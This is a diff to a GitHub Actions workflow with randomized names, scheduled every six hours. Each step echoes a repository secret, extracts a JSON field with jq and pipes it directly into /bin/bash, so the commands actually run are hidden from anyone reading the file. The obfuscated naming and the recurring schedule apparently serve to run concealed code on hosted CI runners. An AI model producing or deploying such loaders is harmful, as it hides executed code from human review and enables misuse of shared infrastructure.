@@ -1,28 +1,23 @@
 name: luazhen1876
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 3/6 * * *'
+    - cron: '32 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: luazhen1876
         env:
-          z3: ${{ secrets.z3 }}
+          tfrn964: ${{ secrets.tfrn964 }}
         run: |
-          echo $z3 | jq -r .eepy807 | /bin/bash
-          echo $xtay2 | jq -r .jmobj095 | /bin/bash
-          echo $uo9 | jq -r .yz23981 | /bin/bash
-          echo $lgy97 | jq -r .qs2727 | /bin/bash
-          echo $ux91 | jq -r .m1803 | /bin/bash
-          echo $ygusm32048 | jq -r .l33398 | /bin/bash
-          echo $cqxua287 | jq -r .lwtxy5 | /bin/bash
-          echo $puuam8990 | jq -r .m725 | /bin/bash
-          echo $ebbt9 | jq -r .gs88 | /bin/bash
-          echo $axata993 | jq -r .g6278 | /bin/bash
-          echo $twuk03858 | jq -r .hu66704 | /bin/bash
+          echo $tfrn964 | jq -r .bq976 | /bin/bash
+          echo $yw90 | jq -r .hkli555 | /bin/bash
+          echo $jsbk50669 | jq -r .saz153 | /bin/bash
+          echo $kza8115 | jq -r .euofn00568 | /bin/bash
+          echo $isklb3 | jq -r .qccgm50 | /bin/bash
+          echo $zjjvq747 | jq -r .gvsnb45900 | /bin/bash
 
